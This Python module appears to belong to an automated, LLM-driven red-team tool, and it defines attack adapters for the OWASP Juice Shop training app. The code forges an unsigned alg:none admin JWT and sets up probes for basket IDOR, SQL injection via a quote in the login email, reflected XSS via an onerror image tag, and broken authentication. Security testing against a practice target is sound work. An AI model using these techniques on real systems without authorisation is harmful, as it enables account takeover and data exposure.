"""Target adapters — keep target-specific knowledge (how to authenticate, which
endpoints are worth testing and what the caller's own object id is) OUT of the generic
orchestration graph.

A ``TargetAdapter`` turns a raw target into the two things the graph needs that it
cannot derive generically in Phase 4:
  * ``bootstrap(client)`` → an auth context (token + the caller's own resource id),
  * ``candidate_endpoints(surface, auth)`` → the object-level endpoints to attack, with
    the reference param's ``sample_value`` set to the caller's own id (so the IDOR
    verifier can build a baseline).

Generic, LLM-driven discovery of own-resource ids is a later enhancement; for the
Phase 4 done-when we use the known Juice Shop basket IDOR.
"""
from __future__ import annotations

import base64
import json
import time
import uuid
from typing import Any, Protocol

import httpx

from schemas.models import AttackSurfaceMap, Endpoint, ParamSchema

# A "candidate" is one object-level thing to attack: the endpoint, the vuln class to
# pin the attacker to, and the auth context that class needs (e.g. a forged JWT for
# broken-auth). The graph iterates these and reports one finding per confirmed class.
Candidate = dict[str, Any]   # {"endpoint": Endpoint, "vuln_class": str, "auth_context": dict}


def _forge_none_jwt(data: dict) -> str:
    """An unsigned (alg:none) JWT — used to probe broken authentication."""
    b = lambda x: base64.urlsafe_b64encode(x).rstrip(b"=").decode()
    h = b(json.dumps({"typ": "JWT", "alg": "none"}).encode())
    p = b(json.dumps({"data": data, "iat": int(time.time()), "exp": int(time.time()) + 3600}).encode())
    return f"{h}.{p}."


class TargetAdapter(Protocol):
    async def bootstrap(self, client: httpx.AsyncClient) -> dict[str, Any]: ...
    def candidate_endpoints(self, surface: AttackSurfaceMap, auth: dict[str, Any]) -> list[Candidate]: ...


class JuiceShopAdapter:
    """Adapter for OWASP Juice Shop."""

    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip("/")

    async def bootstrap(self, client: httpx.AsyncClient) -> dict[str, Any]:
        """Register a fresh user, log in, and return the auth context."""
        email = f"redteam+{uuid.uuid4().hex[:8]}@test.local"
        password = "Password123!"
        reg = await client.post(f"{self.base_url}/api/Users/", json={
            "email": email, "password": password, "passwordRepeat": password,
            "securityQuestion": {"id": 1}, "securityAnswer": "test"})
        if reg.status_code not in (200, 201):
            raise RuntimeError(f"Juice Shop registration failed: {reg.status_code} {reg.text[:200]}")
        login = await client.post(f"{self.base_url}/rest/user/login",
                                  json={"email": email, "password": password})
        auth = login.json()["authentication"]
        return {
            "auth_token": auth["token"],
            "own_resource_id": int(auth["bid"]),
            "hint": "Basket ids are small sequential integers starting at 1; an id other "
                    "than own_resource_id belongs to a different user.",
        }

    def candidate_endpoints(self, surface: AttackSurfaceMap, auth: dict[str, Any]) -> list[Candidate]:
        """Curated object-level probes, one per in-scope vuln class, so a single run can
        confirm every class the system can prove on Juice Shop (IDOR, error-based SQLi,
        reflected XSS, broken auth). Each candidate pins the attacker to its class and
        carries the auth that class needs — e.g. a forged alg:none JWT for broken auth."""
        own = int(auth["own_resource_id"])
        token = auth["auth_token"]
        victim = 1 if own != 1 else 2
        forged = _forge_none_jwt({"id": 1, "email": "admin@juice-sh.op"})
        base = self.base_url
        has_basket = any("/rest/basket" in e.url for e in surface.endpoints)

        candidates: list[Candidate] = []
        # 1. IDOR — read another user's basket (reference id = caller's own, for baseline).
        if has_basket:
            candidates.append({
                "endpoint": Endpoint(url=f"{base}/rest/basket/:id", method="GET",
                                     params=[ParamSchema(name="id", location="path", type="int",
                                                         sample_value=str(own))],
                                     auth_required=True),
                "vuln_class": "IDOR",
                "auth_context": {"auth_token": token, "own_resource_id": own,
                                 "hint": f"basket ids are small sequential integers; request id "
                                         f"{victim} (not own_resource_id {own})"}})
        # 2. Error-based SQL injection on the login endpoint.
        candidates.append({
            "endpoint": Endpoint(url=f"{base}/rest/user/login", method="POST"),
            "vuln_class": "SQLI_ERROR",
            "auth_context": {"hint": "break the login SQL with a single lone quote (') in the "
                                     "email field to leak a database error"}})
        # 3. Reflected XSS via the SPA search query parameter.
        candidates.append({
            "endpoint": Endpoint(url=f"{base}/#/search?q=", method="GET"),
            "vuln_class": "XSS_REFLECTED",
            "auth_context": {"hint": "reflected XSS via the SPA search `q` parameter; use an "
                                     "<img src=x onerror=...> marker"}})
        # 4. Broken authentication — an unsigned (alg:none) admin JWT on a protected route.
        if has_basket:
            candidates.append({
                "endpoint": Endpoint(url=f"{base}/rest/basket/1", method="GET", auth_required=True),
                "vuln_class": "BROKEN_AUTH",
                "auth_context": {"auth_token": forged, "own_resource_id": 1,
                                 "hint": "an unsigned (alg:none) admin JWT is provided; use it as "
                                         "the bearer token on /rest/basket/1"}})
        return candidates
